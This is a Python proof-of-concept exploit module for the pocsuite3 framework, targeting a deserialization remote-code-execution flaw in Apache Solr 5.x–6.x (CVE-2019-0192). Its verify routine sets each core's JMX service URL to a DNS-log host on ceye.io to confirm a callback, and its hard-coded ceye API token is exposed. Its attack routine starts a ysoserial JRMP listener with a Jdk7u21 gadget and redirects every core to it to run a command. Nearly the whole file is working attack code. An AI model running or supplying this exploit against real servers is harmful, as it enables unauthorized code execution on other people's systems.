#!/usr/bin/env python
#coding=utf-8

import random
import json
import time
import subprocess
import signal
import os
import sys
import base64
import re
from string import ascii_letters

from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE

# 需要ysoserial.jar包
# 需要jython-standalone-2.7.1.jar，mjet.py
# 也可以直接只要

'''
CVE-2019-0192
'''
class Solr_RCE_0192(POCBase):
    vulID = 'solr-CVE-2019-1092'
    appName = 'Solr'
    appVersion = 'Apache Solr 5.0.0 to 5.5.5, 6.0.0 to 6.6.5'
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = VUL_TYPE.CODE_EXECUTION
    vulDate = '2019-03-12'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2020-02-19'  # 编写 PoC 的日期
    updateDate = '2020-05-22'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://mp.weixin.qq.com/s/ZtqM2EhB2BbZmDt1omvF6A']  # 漏洞地址来源,0day不用写
    name = 'Solr反序列化远程代码执行漏洞'  # PoC 名称
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"高危"

    
    # 使用随机字符串作为banner，通过ceye的接口判断命令是否被执行
    DOMAIN = 'wvg689.ceye.io'
    TOKEN = '76dce59a986eab595838f7dc74903035'
    BANNER = ''.join([random.choice(ascii_letters) for i in range(6)])
    CEYE_URL = 'http://api.ceye.io/v1/records?token={0}&type=dns&filter={1}'.format(TOKEN, BANNER)


    def _verify(self):
        result={}

        vul_url = self.url    # "http://127.0.0.1:8983"

        target_url = vul_url
        url_cores = vul_url + "/solr/admin/cores?wt=json"

        headers = {"Content-Type": "application/json"}

        command = "'ping {0}.{1}'".format(self.BANNER, self.DOMAIN)

        RMI_DNSLOG = "{0}.{1}".format(self.BANNER, self.DOMAIN)

        RPORT = "9999"

        post_json = {"set-property": {"jmx.serviceUrl": "service:jmx:rmi:///jndi/rmi://{0}:{1}/obj".format(RMI_DNSLOG, RPORT)}}

        core_names = self.get_core_names(url_cores)

        print(core_names)
        
        # 对每个core都发送一次请求
        for core_name in core_names:
            config_url = "/solr/" + core_name + "/config"

            target_url = vul_url + config_url
            
            # 漏洞利用
            r = req.post(target_url, headers=headers, json=post_json)
    

            # 漏洞检测
            if self.test_ns_failed(r) or self.test_exception_flag(r):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target_url
                result['VerifyInfo']['Payload'] = post_json
                return self.save_output(result) 

            # 如果前面没有返回成功，则休眠2s，最后检查DNSlog
            print("Waiting 2s...")
            time.sleep(2) # 休眠2s等待ceye生成记录
    
            if self.test_dnslog(self.CEYE_URL):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target_url
                result['VerifyInfo']['Payload'] = post_json
                return self.save_output(result)
        return self.save_output(result)


    # 验证DNS已被解析，命令执行
    def test_dnslog(self, url):
        resp = req.get(url)
        d = resp.json()
        try:
            sub_domain = d['data'][0]['domain']
            if self.BANNER in sub_domain:
                print(sub_domain)
                return True
        except Exception:
            return False


    # 提供的DNS的域名未被解析成功，也认为已利用成功
    def test_ns_failed(self, p_resp):
        flag = "Unknown host"
        if p_resp.status_code == 500 and flag in p_resp.text:
            return True    


    # 响应中存在这样的异常信息，认为利用成功
    def test_exception_flag(self, p_resp):
        flag = "(undeclared checked exception; nested exception is)"
        if p_resp.status_code == 500 and re.search(flag, p_resp.text):
            return True


    def test_attack_flag(self, p_resp):
        flag = "BadAttributeValueException"   # 与Jdk7u21的payload配套
        if p_resp.status_code == 500 and re.search(flag, p_resp.text):
            return True


    ''' 拿到所有core的名字'''
    def get_core_names(self, p_url_cores):
        r = req.get(p_url_cores, verify=False, allow_redirects=False)
        
        if r.status_code == 200:
            if r.json()['status'] == "":    # 失败，退出
                self.save_output(result)
            else:
                a = list(r.json()['status'].keys())
        return a


    # 攻击模块
    def _attack(self):
        #return self._verify()
        result={}

        vul_url = self.url    # "http://127.0.0.1:8983"

        target_url = vul_url
        url_cores = vul_url + "/solr/admin/cores?wt=json"

        headers = {"Content-Type": "application/json"}

        command = "'ping {0}.{1}'".format(self.BANNER, self.DOMAIN)
        command = "calc"

        # ysoserial文件路径
        YSOSERIAL_PATH = "D:\\repos\\ysoserial-0.0.6-SNAPSHOT-BETA-all.jar"
        # ysoserial的IP，以及监听的RMI端口
        RHOST = "127.0.0.1"   # 到时候填写ysoserial所在服务器的IP
        RPORT = "9999"

        pro_cmd = "java -cp {0} ysoserial.exploit.JRMPListener {1} Jdk7u21 {2}".format(YSOSERIAL_PATH, RPORT, command)
        pro = subprocess.Popen(pro_cmd, stdout=subprocess.PIPE,shell=True)
        

        post_json = {"set-property": {"jmx.serviceUrl": "service:jmx:rmi:///jndi/rmi://{0}:{1}/obj".format(RHOST, RPORT)}}

        core_names = self.get_core_names(url_cores)

        print(core_names)
        
        # 对每个core都发送一次请求
        for core_name in core_names:
            config_url = "/solr/" + core_name + "/config"

            target_url = vul_url + config_url
            
            # 漏洞利用
            r = req.post(target_url, headers=headers, json=post_json) #, proxies={'http': 'http://127.0.0.1:8087'})
    
            if self.test_attack_flag(r):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target_url
                result['VerifyInfo']['Payload'] = post_json
                result['VerifyInfo']['Command'] = pro_cmd
                return self.save_output(result)
        return self.save_output(result)

    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

# 注册类
register_poc(Solr_RCE_0192)
